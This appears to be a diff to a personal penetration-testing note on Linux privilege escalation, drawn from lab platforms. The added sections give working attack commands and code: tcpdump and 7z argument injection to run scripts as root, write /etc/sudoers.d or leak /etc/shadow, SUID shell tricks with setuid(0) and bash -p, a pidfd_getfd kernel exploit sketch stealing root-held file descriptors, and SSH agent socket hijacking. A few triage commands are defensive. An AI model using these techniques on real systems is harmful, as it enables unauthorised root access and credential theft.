@@ -4,7 +4,7 @@ type: technique
 tags: [0xdf, exploitation, git-poc, htb, linux, post-exploitation, privilege-escalation, thm]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-07-14
+date_updated: 2026-07-15
 sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc, hacktricks-linux]
 ---
 
@@ -1426,4 +1426,70 @@ find /run/user /tmp -type s -name 'agent.*' 2>/dev/null
 
 # impersonate the socket's owner
 SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNNN ssh -o IdentitiesOnly=no user@nexthost
+```
+
+## Wildcard / argv injection deep tier: tcpdump -z RCE, 7z @listfile, bsdtar, scp/git
+
+Beyond the `tar --checkpoint-action`, `chown --reference`, and `zip -TT` primitives already covered in the **Sudo + Script Wildcard / Argument Injection** section above, these argv-injection variants keep appearing in appliance wrappers, "download as archive" web features, and over-loose sudoers rules. Payloads are created as filenames in a directory that a privileged job later globs as `*`.
+
+tcpdump is the biggest addition. Its rotation flags chain into arbitrary command execution: `-G` (time rotate) + `-W 1` (one file) + `-z <cmd>` (post-rotate hook) runs `<cmd>` as the tcpdump user (often root on appliances) the moment one matching packet forces a rotate.
+
+```bash
+# wrapper concatenates a user-controlled "file name" field into tcpdump argv:
+/debug/tcpdump --filter="udp port 1234" --file-name="x -i any -W 1 -G 1 -z /mnt/usb/rce.sh"
+# then send one matching packet to trigger the rotate -> rce.sh runs as root
+```
+
+Loose sudoers `tcpdump` rules (constraining only the first `-w`) give arbitrary root-owned write and file read, because tcpdump accepts multiple `-w` (last wins), plus `-Z`, `-r`, `-V`:
+
+```bash
+sudo tcpdump -c10 -w/allowed/a/ -Z root -w /etc/sudoers.d/1 -r payload.pcap -F /allowed/filter.<GUID>  # write root file from a crafted pcap
+sudo tcpdump -c10 -w/allowed/a/ -V /root/root.txt -w /tmp/x -F /allowed/filter.<GUID>                  # -V leaks file contents via error diagnostics
+```
+
+7-Zip survives a defensive `-- *` because it treats a filename beginning with `@` as a file-LIST; symlink it at a secret and 7z prints the target to stderr while failing:
+
+```bash
+ln -s /etc/shadow root.txt; touch @root.txt      # then root's:  7za a out.7z -t7z -snl -- *  leaks /etc/shadow
+```
+
+Others: bsdtar/macOS has no `--checkpoint` but `--use-compress-program=/bin/sh` (and `--newer-mtime=@<file>` to read a file); `rsync` `-e sh shell.sh` or `--rsync-path`; `scp -S <cmd>`; `git -c core.sshCommand=<cmd>`; `flock -c <cmd>`. Triage with pspy to watch real argv during cron/systemd and grep sudoers.
+
+```bash
+pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'
+rg -n '(tar|bsdtar|rsync|zip|7z|chown|chmod|tcpdump).*(\*|\$@|\$\*)' /etc /opt /usr/local /srv 2>/dev/null
+```
+
+## euid/ruid/suid semantics: why SUID shells drop privileges and how bash -p keeps them
+
+A recurring reason a SUID-root exploit "works but gives no root shell" is the difference between real/effective/saved UID. `ruid` is who launched the process; `euid` is what the kernel checks for privilege (equals the file owner after a SUID exec); `suid` is the saved copy that lets a privileged process temporarily drop and reclaim. A non-root process may only set its `euid` to one of its current `ruid`/`euid`/`suid`.
+
+The trap: `bash` (and `sh`) reset `euid` down to `ruid` on startup unless invoked with `-p`. So a SUID binary that calls `system("...")` (which runs `/bin/sh -c`) or execs bash without `-p` loses the elevated `euid` and you land back as the unprivileged user. Two fixes:
+
+```c
+setuid(0);                 // aligns ruid=euid=suid=0 first (needs the process to be able to)
+execl("/bin/bash","bash","-p",NULL);   // -p preserves the elevated euid instead of dropping to ruid
+```
+
+- If you fully control the SUID C program: call `setresuid(0,0,0)` / `setuid(0)` BEFORE spawning the shell so all three IDs are root, then a plain shell keeps root.
+- If you only trigger a shell from a SUID binary you do not control: always request `bash -p` (or a static shell) so `euid` is not reset. `setreuid(x,x)`/`setresuid` that equalize `ruid` and `euid` also make a subsequent bash keep the identity.
+
+Quick check of the three IDs at runtime: `id` shows `uid`(ruid) and `euid` separately when they differ; `cat /proc/self/status | grep -E '^(Uid|Gid)'` prints real/effective/saved/fs in order.
+
+## Kernel LPE via ptrace exit-race + pidfd_getfd FD theft (CVE-2026-46333) and the YAMA gate
+
+A modern, reusable kernel-privesc shape: turn a ptrace-authorization bug into stealing an already-open, already-authorized file descriptor from a privileged process, instead of exploiting the helper's own logic. `pidfd_getfd()` duplicates an fd from another process after a ptrace-style permission check; if that check is wrongly granted during a teardown window (process exiting or dropping creds), an unprivileged attacker copies the fd and the kernel then enforces operations on the STOLEN fd, not on the pathname or a fresh auth flow.
+
+```c
+int p = pidfd_open(victim_pid, 0);
+int stolen = pidfd_getfd(p, victim_fd, 0);   // race while victim is exiting / dropping privileges
+/* read() /etc/shadow or /etc/ssh/*_key from a root-opened fd, or drive a stolen authenticated D-Bus/systemd channel to get root-side actions */
+```
+
+Good targets are setuid/file-cap binaries and root daemons that briefly hold something valuable: an open `/etc/shadow` or SSH host key, or an authenticated system-bus connection (password/account helpers, SSH helpers, PolicyKit/D-Bus mediated helpers). The exploit needs only a ptrace relationship (e.g. being the parent of a spawned privileged child under permissive YAMA), not a bug in the helper.
+
+`kernel.yama.ptrace_scope` is the practical gate and is worth checking on any target for this whole ptrace-abuse family: `0` = classic same-UID; `1` = parent->child allowed (keeps many public exploits reachable); `2` = needs `CAP_SYS_PTRACE`, breaks the unprivileged `pidfd_getfd()` path with `-EPERM`; `3` = ptrace attach disabled until reboot.
+
+```bash
+cat /proc/sys/kernel/yama/ptrace_scope
 ```
